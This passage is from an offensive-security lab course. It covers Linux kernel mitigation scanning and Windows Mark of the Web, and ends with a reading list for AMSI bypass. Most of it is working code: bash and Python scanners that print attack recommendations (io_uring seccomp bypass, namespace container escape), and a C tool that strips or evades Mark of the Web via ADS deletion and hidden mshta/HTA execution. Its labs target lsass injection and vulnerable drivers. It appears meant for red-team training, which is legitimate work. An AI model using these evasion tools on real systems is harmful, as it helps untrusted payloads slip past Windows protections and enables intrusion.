.\bin\unified_recon.exe bin\vuln_capstone_weak.exe bin\vuln_capstone_hard.exe

# Analyze specific binaries
.\bin\unified_recon.exe C:\Windows\System32\notepad.exe C:\Windows\System32\calc.exe
```

### Linux Mitigation Fingerprinting

Linux systems have their own set of security boundaries that differ significantly from Windows. This scanner checks kernel hardening features. **Why this matters**: io_uring is a game-changer for Linux exploitation - it allows file and network operations without triggering seccomp filters, making it a powerful sandbox escape vector.

```bash
#!/bin/bash
# ~/offensive_lab/linux_mitigation_scanner.sh
# Fingerprints kernel hardening, sandboxing, and exploit mitigations

cat << 'BANNER'
          Linux Mitigation Scanner - Offensive Recon
BANNER

echo ""
echo "=== KERNEL HARDENING STATUS ==="
echo ""

# KASLR
echo -n "[*] KASLR: "
if cat /proc/kallsyms 2>/dev/null | head -1 | grep -q "0000000000000000"; then
    echo "ENABLED (symbols zeroed for non-root)"
    echo "    Attack: Need info leak or /dev/mem access"
else
    echo "READABLE or disabled"
    if [ "$(id -u)" = "0" ]; then
        KBASE=$(cat /proc/kallsyms | head -1 | awk '{print $1}')
        echo "    Kernel base: 0x$KBASE"
    fi
fi

# SMEP/SMAP (CPU features)
echo -n "[*] SMEP: "
if grep -q smep /proc/cpuinfo 2>/dev/null; then
    echo "SUPPORTED (blocks user-space code exec from kernel)"
    echo "    Attack: ROP/JOP required, can't jump to userspace shellcode"
else
    echo "NOT SUPPORTED - ret2user viable"
fi

echo -n "[*] SMAP: "
if grep -q smap /proc/cpuinfo 2>/dev/null; then
    echo "SUPPORTED (blocks user-space data access from kernel)"
    echo "    Attack: Need copy_from_user or disable SMAP (popf gadget)"
else
    echo "NOT SUPPORTED - can access userspace data from kernel"
fi

# Kernel lockdown
echo -n "[*] Kernel Lockdown: "
if [ -f /sys/kernel/security/lockdown ]; then
    LOCKDOWN=$(cat /sys/kernel/security/lockdown)
    echo "$LOCKDOWN"
    if [[ "$LOCKDOWN" == *"[integrity]"* ]] || [[ "$LOCKDOWN" == *"[confidentiality]"* ]]; then
        echo "    Attack: /dev/mem, kexec, BPF restricted"
    fi
else
    echo "NOT CONFIGURED"
fi

# KFENCE (production memory safety)
echo -n "[*] KFENCE: "
if [ -d /sys/kernel/debug/kfence ] 2>/dev/null; then
    echo "ENABLED (sampling memory safety)"
    echo "    Impact: Some UAF/OOB bugs will be detected"
else
    echo "Not detected"
fi

echo ""
echo "=== SANDBOX/LSM STATUS ==="
echo ""

# Check active LSMs
echo "[*] Active LSMs:"
if [ -f /sys/kernel/security/lsm ]; then
    cat /sys/kernel/security/lsm
fi

# Landlock (unprivileged sandboxing)
echo ""
echo -n "[*] Landlock LSM: "
if [ -f /sys/kernel/security/landlock/abi_version ]; then
    VERSION=$(cat /sys/kernel/security/landlock/abi_version)
    echo "AVAILABLE (ABI version $VERSION)"
    echo "    Applications can sandbox themselves without root"
    echo "    Check: strace -e landlock_create_ruleset app"
else
    echo "NOT AVAILABLE"
fi

# eBPF LSM
echo -n "[*] eBPF LSM: "
if grep -q bpf /sys/kernel/security/lsm 2>/dev/null; then
    echo "ENABLED"
    echo "    [!] Programs can attach BPF LSM hooks"
    echo "    Check for security policy BPF programs"
else
    echo "Not in active LSMs"
fi

# BPF restrictions
echo "[*] BPF Unprivileged Access:"
UNPRIVBPF=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
case $UNPRIVBPF in
    0) echo "    ALLOWED - unprivileged users can load BPF" ;;
    1) echo "    DISABLED - requires CAP_BPF/root" ;;
    2) echo "    PERMANENTLY DISABLED" ;;
    *) echo "    Unknown ($UNPRIVBPF)" ;;
esac

echo ""
echo "=== SECCOMP & io_uring STATUS ==="
echo ""

# Check seccomp support
echo -n "[*] Seccomp: "
if grep -q SECCOMP /proc/self/status; then
    SECCOMP_MODE=$(grep Seccomp /proc/self/status | awk '{print $2}')
    case $SECCOMP_MODE in
        0) echo "AVAILABLE (this shell not filtered)" ;;
        1) echo "STRICT MODE (only read/write/exit)" ;;
        2) echo "FILTER MODE (BPF filtering active)" ;;
    esac
else
    echo "NOT AVAILABLE"
fi

# io_uring - THE HOT ATTACK SURFACE
echo ""
echo "[*] io_uring Status:"
echo "    [!!!] io_uring BYPASSES seccomp filters!"
echo ""
IOURING_DISABLED=$(cat /proc/sys/kernel/io_uring_disabled 2>/dev/null)
case $IOURING_DISABLED in
    0)
        echo "    io_uring: FULLY ENABLED"
        echo "    [!] All users can use io_uring - seccomp bypass possible!"
        echo "    Attack: Use io_uring ops instead of blocked syscalls"
        ;;
    1)
        echo "    io_uring: RESTRICTED (CAP_SYS_RESOURCE required)"
        echo "    Unprivileged io_uring disabled"
        ;;
    2)
        echo "    io_uring: FULLY DISABLED"
        echo "    Hardened against io_uring attacks"
        ;;
    *)
        # Check if io_uring exists another way
        if [ -e /proc/self/fdinfo ] && ls /proc/*/fdinfo 2>/dev/null | head -1 | xargs grep -l io_uring 2>/dev/null; then
            echo "    io_uring: ENABLED (processes using it detected)"
        else
            echo "    io_uring: Status unclear, test with io_uring_setup syscall"
        fi
        ;;
esac

echo ""
echo "=== USER NAMESPACE STATUS ==="
echo ""

# User namespaces - critical for container escapes
USERNS=$(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null || \
         cat /proc/sys/user/max_user_namespaces 2>/dev/null)

echo -n "[*] Unprivileged User Namespaces: "
if [ "$USERNS" = "0" ]; then
    echo "DISABLED"
    echo "    Container escapes via userns harder"
    echo "    Many sandbox escapes blocked"
else
    echo "ENABLED"
    echo "    [!] Can create user namespaces without root"
    echo "    Attack: userns -> mount namespace -> escape attempts"
fi

echo ""
echo "=== ATTACK PATH RECOMMENDATIONS ==="
echo ""
echo "Linux-Specific Attack Vectors:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ "$IOURING_DISABLED" != "2" ] && [ "$IOURING_DISABLED" != "1" ]; then
    echo "[!] io_uring ENABLED: Use for seccomp bypass"
    echo "    -> io_uring ops don't trigger seccomp filters"
    echo "    -> Read/write files, network I/O without syscalls"
fi

if [ "$USERNS" != "0" ]; then
    echo "[!] User namespaces ENABLED: Container escape vector"
    echo "    -> Create privileged namespace context"
    echo "    -> Pair with other vulns for escape"
fi

if ! grep -q bpf /sys/kernel/security/lsm 2>/dev/null; then
    echo "[+] No eBPF LSM: Traditional evasion techniques work"
fi

echo ""
echo "[*] Run this on target to identify attack surface"
echo "[*] For containers: also check cgroup escapes, /proc mounts"
```

```python
#!/usr/bin/env python3
# ~/offensive_lab/linux_recon.py

import os
import subprocess
from pathlib import Path

class LinuxMitigationScanner:
    def __init__(self):
        self.results = {}

    def check_kaslr(self):
        """Check KASLR status"""
        try:
            with open('/proc/kallsyms', 'r') as f:
                first_line = f.readline()
                if first_line.startswith('0000000000000000'):
                    return {'enabled': True, 'note': 'Symbols hidden from non-root'}
                else:
                    addr = first_line.split()[0]
                    return {'enabled': True, 'kernel_base': f'0x{addr}'}
        except PermissionError:
            return {'enabled': True, 'note': 'Cannot read kallsyms'}
        except:
            return {'enabled': 'unknown'}

    def check_cpu_features(self):
        """Check SMEP/SMAP/other CPU mitigations"""
        features = {}
        try:
            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read()
                features['smep'] = 'smep' in cpuinfo
                features['smap'] = 'smap' in cpuinfo
                features['umip'] = 'umip' in cpuinfo  # User-Mode Instruction Prevention
                features['pti'] = 'pti' in cpuinfo    # Page Table Isolation (Meltdown)
        except:
            pass
        return features

    def check_io_uring(self):
        """Check io_uring availability - CRITICAL for seccomp bypass"""
        try:
            disabled = int(Path('/proc/sys/kernel/io_uring_disabled').read_text().strip())
            return {
                'status': ['fully_enabled', 'restricted', 'fully_disabled'][disabled],
                'seccomp_bypass': disabled == 0,
                'note': 'io_uring operations bypass seccomp filters!' if disabled == 0 else ''
            }
        except:
            # Try to actually use io_uring
            return {'status': 'check_manually', 'note': 'Test with io_uring_setup'}

    def check_landlock(self):
        """Check Landlock LSM availability"""
        landlock_path = Path('/sys/kernel/security/landlock/abi_version')
        if landlock_path.exists():
            version = landlock_path.read_text().strip()
            return {'available': True, 'abi_version': int(version)}
        return {'available': False}

    def check_user_namespaces(self):
        """Check if unprivileged user namespaces are allowed"""
        paths = [
            '/proc/sys/kernel/unprivileged_userns_clone',
            '/proc/sys/user/max_user_namespaces'
        ]
        for path in paths:
            try:
                value = int(Path(path).read_text().strip())
                return {
                    'enabled': value != 0,
                    'path': path,
                    'value': value,
                    'attack_note': 'Can create user namespaces for sandbox escape' if value != 0 else ''
                }
            except:
                continue
        return {'enabled': 'unknown'}

    def check_kfence(self):
        """Check KFENCE (kernel memory safety) status"""
        kfence_path = Path('/sys/kernel/debug/kfence')
        return {
            'enabled': kfence_path.exists(),
            'note': 'Some UAF/OOB bugs will be detected at runtime' if kfence_path.exists() else ''
        }

    def check_seccomp_status(self):
        """Check seccomp status of current process"""
        try:
            with open('/proc/self/status', 'r') as f:
                for line in f:
                    if line.startswith('Seccomp:'):
                        mode = int(line.split()[1])
                        return {
                            'mode': mode,
                            'mode_name': ['disabled', 'strict', 'filter'][mode],
                            'note': 'Seccomp active - check io_uring bypass!' if mode == 2 else ''
                        }
        except:
            pass
        return {'mode': 'unknown'}

    def check_ebpf_lsm(self):
        """Check if eBPF LSM is active"""
        try:
            lsm = Path('/sys/kernel/security/lsm').read_text().strip()
            return {
                'active_lsms': lsm.split(','),
                'bpf_lsm': 'bpf' in lsm,
                'note': 'eBPF LSM can enforce custom security policies' if 'bpf' in lsm else ''
            }
        except:
            return {'bpf_lsm': 'unknown'}

    def full_scan(self):
        """Run all checks and return results"""
        print("=" * 60)
        print("Linux Mitigation Scanner - Offensive Reconnaissance")
        print("=" * 60)

        checks = {
            'kaslr': self.check_kaslr(),
            'cpu_features': self.check_cpu_features(),
            'io_uring': self.check_io_uring(),
            'landlock': self.check_landlock(),
            'user_namespaces': self.check_user_namespaces(),
            'kfence': self.check_kfence(),
            'seccomp': self.check_seccomp_status(),
            'ebpf_lsm': self.check_ebpf_lsm(),
        }

        for name, result in checks.items():
            print(f"\n[{name.upper()}]")
            for key, value in result.items():
                print(f"  {key}: {value}")

        # Attack recommendations
        print("\n" + "=" * 60)
        print("ATTACK RECOMMENDATIONS")
        print("=" * 60)

        if checks['io_uring'].get('seccomp_bypass'):
            print("\n[!] CRITICAL: io_uring can bypass seccomp!")
            print("    Use io_uring for file/network ops in sandboxed process")

        if checks['user_namespaces'].get('enabled'):
            print("\n[!] User namespaces enabled - container escape vector")
            print("    Combine with other vulns for privilege escalation")

        if not checks['cpu_features'].get('smap'):
            print("\n[+] SMAP not supported - kernel can access userspace directly")

        return checks


if __name__ == "__main__":
    scanner = LinuxMitigationScanner()
    scanner.full_scan()
```

### Mark of the Web (MOTW)

Mark of the Web (MOTW) is a critical security boundary that determines whether downloaded files are trusted. It's implemented via NTFS Alternate Data Streams (ADS) and affects SmartScreen, Smart App Control, ASR rules, and WDAC policies.

**Why MOTW Matters for Red Teams:**

- **Initial access blocker**: Phishing attachments, downloaded payloads, and USB drops get MOTW tags
- **Execution prevention**: MOTW files trigger SmartScreen warnings, ASR blocks, and SAC enforcement
- **Defense evasion requirement**: Must bypass or remove MOTW to execute untrusted code
- **Forensics indicator**: MOTW presence/absence reveals attack vector and sophistication

**MOTW Architecture:**

```text
┌─────────────────────────────────────────────────────────────────┐
│                    Mark of the Web Flow                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. File Download/Creation                                      │
│     ┌───────────────────────────────────────────────────────┐   │
│     │ Browser/Email/SMB -> Downloads file.exe               │   │
│     │ Writes Zone.Identifier ADS to file.exe:Zone.Identifier│   │
│     │ (Windows 11 24H2+: Also writes :SmartScreen ADS)      │   │
│     └───────────────────────────────────────────────────────┘   │
│                          ↓                                      │
│  2. Zone.Identifier Content                                     │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ [ZoneTransfer]                                       │    │
│     │ ZoneId=3          ← Internet zone (untrusted)        │    │
│     │ ReferrerUrl=https://attacker.com/payload.exe         │    │
│     │ HostUrl=https://attacker.com/payload.exe             │    │
│     └──────────────────────────────────────────────────────┘    │
│                          ↓                                      │
│  3. Execution Attempt                                           │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ User double-clicks file.exe                          │    │
│     │ Windows checks for Zone.Identifier ADS               │    │
│     └──────────────────────────────────────────────────────┘    │
│                          ↓                                      │
│  4. Security Policy Enforcement                                 │
│     ┌──────────────────────────────────────────────────────┐    │
│     │ SmartScreen: "This file is not commonly downloaded"  │    │
│     │ Smart App Control: Block unsigned MOTW files         │    │
│     │ ASR: Block executable content from email/webmail     │    │
│     │ WDAC: Apply stricter rules to MOTW files             │    │
│     └──────────────────────────────────────────────────────┘    │
│                                                                 │
│  Zone IDs:                                                      │
│  0 = Local Computer (trusted)                                   │
│  1 = Local Intranet (trusted)                                   │
│  2 = Trusted Sites                                              │
│  3 = Internet (MOTW applied)                                    │
│  4 = Restricted Sites                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**MOTW Analysis:**

```c
// motw_recon.c
// Compile: cl src\motw_recon.c /Fe:bin\motw_recon.exe advapi32.lib shell32.lib urlmon.lib

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <urlmon.h>

#pragma comment(lib, "urlmon.lib")

#define URLZONE_LOCAL_MACHINE  0
#define URLZONE_INTRANET       1
#define URLZONE_TRUSTED        2
#define URLZONE_INTERNET       3
#define URLZONE_UNTRUSTED      4

typedef struct {
    char filepath[MAX_PATH];
    BOOL hasMotw;
    DWORD zoneId;
    char referrerUrl[512];
    char hostUrl[512];
} MOTWInfo;

// Check if file has MOTW
BOOL CheckMOTW(const char* filepath, MOTWInfo* info) {
    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", filepath);

    HANDLE hFile = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        info->hasMotw = FALSE;
        return FALSE;
    }

    char buffer[2048] = {0};
    DWORD bytesRead = 0;
    ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
    CloseHandle(hFile);

    info->hasMotw = TRUE;

    char* zoneIdStr = strstr(buffer, "ZoneId=");
    if (zoneIdStr) {
        info->zoneId = atoi(zoneIdStr + 7);
    }

    char* referrerStr = strstr(buffer, "ReferrerUrl=");
    if (referrerStr) {
        char* end = strchr(referrerStr, '\r');
        if (!end) end = strchr(referrerStr, '\n');
        if (end) {
            size_t len = end - (referrerStr + 12);
            if (len < sizeof(info->referrerUrl)) {
                memcpy(info->referrerUrl, referrerStr + 12, len);
                info->referrerUrl[len] = '\0';
            }
        }
    }

    return TRUE;
}

// Remove MOTW
BOOL RemoveMOTW(const char* filepath) {
    char adsPath[MAX_PATH + 30];
    BOOL success = FALSE;

    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", filepath);
    if (DeleteFileA(adsPath)) {
        printf("[+] MOTW removed\n");
        success = TRUE;
    }

    snprintf(adsPath, sizeof(adsPath), "%s:SmartScreen", filepath);
    DeleteFileA(adsPath);  // Windows 11 24H2+

    return success;
}

// Copy file without MOTW
BOOL CopyWithoutMOTW(const char* source, const char* dest) {
    HANDLE hSource = CreateFileA(source, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hSource, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hSource, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hSource);

    HANDLE hDest = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        free(buffer);
        return FALSE;
    }

    DWORD bytesWritten;
    WriteFile(hDest, buffer, bytesRead, &bytesWritten, NULL);
    CloseHandle(hDest);
    free(buffer);

    printf("[+] Copied without MOTW: %s -> %s\n", source, dest);
    return TRUE;
}

// Test FileFix bypass - HTA execution without MOTW
BOOL TestFileFixBypass(const char* testFile) {
    printf("\n[TEST] FileFix (HTA) Bypass\n");

    char htaPath[MAX_PATH];
    GetTempPathA(MAX_PATH, htaPath);
    strcat(htaPath, "test_filefix.hta");

    char absTestFile[MAX_PATH];
    if (!GetFullPathNameA(testFile, MAX_PATH, absTestFile, NULL)) return FALSE;

    HANDLE hFile = CreateFileA(htaPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create HTA\n");
        return FALSE;
    }

    char htaContent[4096];
    snprintf(htaContent, sizeof(htaContent),
        "<html><head><HTA:APPLICATION SHOWINTASKBAR=\"no\" WINDOWSTATE=\"minimize\"/></head>\n"
        "<body><script language=\"JScript\">\n"
        "var shell = new ActiveXObject('WScript.Shell');\n"
        "var fso = new ActiveXObject('Scripting.FileSystemObject');\n"
        "var dst = shell.ExpandEnvironmentStrings('%%TEMP%%') + '\\\\test_clean.exe';\n"
        "try { fso.CopyFile('%s', dst, true); } catch(e) {}\n"
        "window.close();\n"
        "</script></body></html>\n",
        absTestFile);

    DWORD written;
    WriteFile(hFile, htaContent, strlen(htaContent), &written, NULL);
    CloseHandle(hFile);

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found\n");
        DeleteFileA(htaPath);
        return FALSE;
    }

    char execCmd[1024];
    snprintf(execCmd, sizeof(execCmd), "\"%s\" \"%s\"", mshtaPath, htaPath);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL success = FALSE;
    if (CreateProcessA(NULL, execCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        char copiedFile[MAX_PATH];
        ExpandEnvironmentStringsA("%TEMP%\\test_clean.exe", copiedFile, MAX_PATH);

        MOTWInfo info = {0};
        if (!CheckMOTW(copiedFile, &info)) {
            printf("[+] SUCCESS: File copied without MOTW via HTA\n");
            success = TRUE;
        }
        DeleteFileA(copiedFile);
    }

    DeleteFileA(htaPath);
    return success;
}

// Test mshta.exe inline execution
BOOL TestMshtaBypass(const char* testFile) {
    printf("\n[TEST] mshta.exe Inline Execution\n");

    char mshtaPath[MAX_PATH];
    ExpandEnvironmentStringsA("%SystemRoot%\\System32\\mshta.exe", mshtaPath, MAX_PATH);

    if (GetFileAttributesA(mshtaPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] mshta.exe not found\n");
        return FALSE;
    }

    char absTestFile[MAX_PATH];
    if (!GetFullPathNameA(testFile, MAX_PATH, absTestFile, NULL)) return FALSE;

    char inlineCmd[2048];
    snprintf(inlineCmd, sizeof(inlineCmd),
        "\"%s\" \"javascript:var s=new ActiveXObject('WScript.Shell');"
        "var f=new ActiveXObject('Scripting.FileSystemObject');"
        "var t=s.ExpandEnvironmentStrings('%%TEMP%%')+'\\\\\\\\mshta_test.exe';"
        "try{f.CopyFile('%s',t,true);}catch(e){}"
        "close();\"",
        mshtaPath, absTestFile);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL success = FALSE;
    if (CreateProcessA(NULL, inlineCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        char copiedFile[MAX_PATH];
        ExpandEnvironmentStringsA("%TEMP%\\mshta_test.exe", copiedFile, MAX_PATH);

        MOTWInfo info = {0};
        if (!CheckMOTW(copiedFile, &info)) {
            printf("[+] SUCCESS: mshta.exe executed inline code\n");
            success = TRUE;
        }
        DeleteFileA(copiedFile);
    }

    return success;
}

// Test ADS deletion
BOOL TestADSDeletion(const char* testFile) {
    printf("\n[TEST] ADS Deletion\n");

    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempFile);
    strcat(tempFile, "test_ads.exe");

    if (!CopyFileA(testFile, tempFile, FALSE)) {
        printf("[-] Failed to copy test file\n");
        return FALSE;
    }

    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", tempFile);
    HANDLE hAds = CreateFileA(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hAds == INVALID_HANDLE_VALUE) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    const char* motw = "[ZoneTransfer]\r\nZoneId=3\r\n";
    DWORD written;
    WriteFile(hAds, motw, strlen(motw), &written, NULL);
    CloseHandle(hAds);

    MOTWInfo info = {0};
    if (!CheckMOTW(tempFile, &info)) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    if (!DeleteFileA(adsPath)) {
        DeleteFileA(tempFile);
        return FALSE;
    }

    if (CheckMOTW(tempFile, &info)) {
        printf("[-] MOTW still present\n");
        DeleteFileA(tempFile);
        return FALSE;
    }

    printf("[+] SUCCESS: MOTW removed\n");
    DeleteFileA(tempFile);
    return TRUE;
}

// Test copy without ADS
BOOL TestCopyWithoutADS(const char* testFile) {
    printf("\n[TEST] Copy Without ADS\n");

    char sourceFile[MAX_PATH], destFile[MAX_PATH];
    GetTempPathA(MAX_PATH, sourceFile);
    strcat(sourceFile, "test_source.exe");
    GetTempPathA(MAX_PATH, destFile);
    strcat(destFile, "test_dest.exe");

    if (!CopyFileA(testFile, sourceFile, FALSE)) {
        printf("[-] Failed to copy test file\n");
        return FALSE;
    }

    char adsPath[MAX_PATH + 30];
    snprintf(adsPath, sizeof(adsPath), "%s:Zone.Identifier", sourceFile);
    HANDLE hAds = CreateFileA(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hAds == INVALID_HANDLE_VALUE) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    const char* motw = "[ZoneTransfer]\r\nZoneId=3\r\n";
    DWORD written;
    WriteFile(hAds, motw, strlen(motw), &written, NULL);
    CloseHandle(hAds);

    MOTWInfo info = {0};
    if (!CheckMOTW(sourceFile, &info)) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    HANDLE hSource = CreateFileA(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
        DeleteFileA(sourceFile);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hSource, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hSource, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hSource);

    HANDLE hDest = CreateFileA(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDest == INVALID_HANDLE_VALUE) {
        free(buffer);
        DeleteFileA(sourceFile);
        return FALSE;
    }

    DWORD bytesWritten;
    WriteFile(hDest, buffer, bytesRead, &bytesWritten, NULL);
    CloseHandle(hDest);
    free(buffer);

    if (CheckMOTW(destFile, &info)) {
        printf("[-] Destination has MOTW\n");
        DeleteFileA(sourceFile);
        DeleteFileA(destFile);
        return FALSE;
    }

    printf("[+] SUCCESS: Copied without MOTW\n");
    DeleteFileA(sourceFile);
    DeleteFileA(destFile);
    return TRUE;
}

// Run all bypass tests
void RunBypassTests(const char* testFile) {
    printf("\n=================================\n");
    printf(" MOTW Bypass Testing Suite         \n");
    printf("===================================\n");
    printf("\nTesting: %s\n", testFile);

    int total = 0, passed = 0;

    total++; if (TestFileFixBypass(testFile)) passed++;
    total++; if (TestMshtaBypass(testFile)) passed++;
    total++; if (TestADSDeletion(testFile)) passed++;
    total++; if (TestCopyWithoutADS(testFile)) passed++;

    printf("\n================================================================\n");
    printf(" Results: %d/%d bypasses working\n", passed, total);
    printf("================================================================\n");
    printf("\nRecommended methods:\n");
    printf("  1. FileFix (HTA) - UNPATCHED, most effective\n");
    printf("  2. mshta.exe inline - BY DESIGN, won't be patched\n");
    printf("  3. ADS deletion - Always works, easily detected\n");
    printf("  4. Copy without ADS - Always works, less noisy\n\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("\nUsage:\n");
        printf("  %s check <file>     - Check if file has MOTW\n", argv[0]);
        printf("  %s remove <file>    - Remove MOTW from file\n", argv[0]);
        printf("  %s copy <src> <dst> - Copy without MOTW\n", argv[0]);
        printf("  %s test <file>      - Test all bypass methods\n", argv[0]);
        printf("\n");
        return 1;
    }

    if (strcmp(argv[1], "check") == 0 && argc >= 3) {
        MOTWInfo info = {0};
        if (CheckMOTW(argv[2], &info)) {
            printf("\n[+] File has MOTW\n");
            printf("    ZoneId: %d ", info.zoneId);
            switch (info.zoneId) {
                case URLZONE_LOCAL_MACHINE: printf("(Local - Trusted)\n"); break;
                case URLZONE_INTRANET: printf("(Intranet - Trusted)\n"); break;
                case URLZONE_TRUSTED: printf("(Trusted Sites)\n"); break;
                case URLZONE_INTERNET: printf("(Internet - UNTRUSTED)\n"); break;
                case URLZONE_UNTRUSTED: printf("(Restricted)\n"); break;
            }
            if (info.referrerUrl[0]) printf("    Referrer: %s\n", info.referrerUrl);
        } else {
            printf("\n[-] File does NOT have MOTW\n");
        }
    }
    else if (strcmp(argv[1], "remove") == 0 && argc >= 3) {
        RemoveMOTW(argv[2]);
    }
    else if (strcmp(argv[1], "copy") == 0 && argc >= 4) {
        CopyWithoutMOTW(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "test") == 0 && argc >= 3) {
        RunBypassTests(argv[2]);
    }
    else {
        printf("[-] Unknown command\n");
        return 1;
    }

    return 0;
}
```

**Compile and Run**

```bash
cd C:\Windows_Mitigation_Lab
cl src\motw_recon.c /Fe:bin\motw_recon.exe advapi32.lib shell32.lib urlmon.lib

# Download test file via Edge (gets MOTW automatically)
# Example: https://www.7-zip.org/a/7z2408-x64.exe
# Save to: C:\Windows_Mitigation_Lab\7z2408-x64.exe

# Check if file has MOTW
.\bin\motw_recon.exe check 7z2408-x64.exe

# Test ALL bypass methods (shows what works on your system)
.\bin\motw_recon.exe test 7z2408-x64.exe

# Copy file without MOTW (less noisy than removal)
.\bin\motw_recon.exe copy 7z2408-x64.exe 7z2408-x64_clean.exe

# Remove MOTW (more noisy, detected by EDR)
.\bin\motw_recon.exe remove 7z2408-x64.exe

# PowerShell verification commands
Get-Item 7z2408-x64.exe -Stream * | Format-Table Stream, Length
Get-Content 7z2408-x64.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue
Get-Content 7z2408-x64.exe -Stream SmartScreen -ErrorAction SilentlyContinue  # Windows 11 24H2+
Get-Item 7z2408-x64.exe | Select-Object Name, Length, LastWriteTime
```

### Practical Exercise

**Lab 1.1: System Reconnaissance (Windows)**

1. Run `unified_recon.exe` on your target Windows VM
2. Document which system-level mitigations are enabled (VBS, CET, XFG)
3. Identify the attack surface based on findings

**Lab 1.2: Process Hunting (Windows)**

1. Identify processes running without CFG/XFG
2. Check for CET Shadow Stack status on high-value targets (lsass.exe)
3. Document potential injection targets without modern mitigations

**Lab 1.3: Driver Enumeration (Windows)**

1. List all loaded kernel drivers
2. Cross-reference with loldrivers.io
3. Identify potential BYOVD targets

**Lab 1.4: Linux Reconnaissance**

1. Run `linux_mitigation_scanner.sh` on target Linux system
2. Check io_uring status (critical for seccomp bypass!)
3. Document Landlock, eBPF LSM, and user namespace status
4. Identify attack paths based on what's enabled/disabled

**Lab 1.5: Attack Path Planning**
Based on your recon, document:

- Primary attack vector (kernel/usermode)
- Required primitives (info leak, code exec, privesc)
- Mitigation bypass requirements

### Key Takeaways

- **Recon is critical**: Know your target's defenses before attacking
- **Weak processes exist**: Even modern systems have legacy unprotected binaries
- **VBS status determines kernel attack viability**
- **Driver enumeration reveals BYOVD opportunities**
- **Attack path planning saves time and reduces detection risk**

### Discussion Questions

1. How would you prioritize targets based on recon findings?
2. What additional information would you gather before exploitation?
3. How does Windows 24H2 KASLR restriction affect kernel exploitation?
4. Why is knowing VBS/HVCI status critical for your attack plan?
5. How would you approach a fully hardened system (all mitigations enabled)?

## Day 2: AMSI Bypass and Script-Based Attack Techniques

- **Goal**: Master AMSI internals and implement multiple bypass techniques for script-based attacks.
- **Activities**:
  - _Reading_:
    - [AMSI Documentation](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
    - [AMSI How It Works](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
    - [RastaMouse - AMSI Bypass Analysis](https://rastamouse.me/memory-patching-amsi-bypass/)
  - _Online Resources_:
    - [Introduction to Sandbox Evasion and AMSI Bypasses](https://www.youtube.com/watch?v=F_BvtXzH4a4)
    - [Blind EDR with Windows Symbolic Link](https://www.zerosalarium.com/2025/01/byovd%20next%20level%20blind%20EDR%20windows%20symbolic%20link.html)
    - [S3cur3Th1sSh1t - AMSI Bypass Compilation](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
    - [AMSITrigger Tool](https://github.com/RythmStick/AMSITrigger) - Find AMSI trigger strings

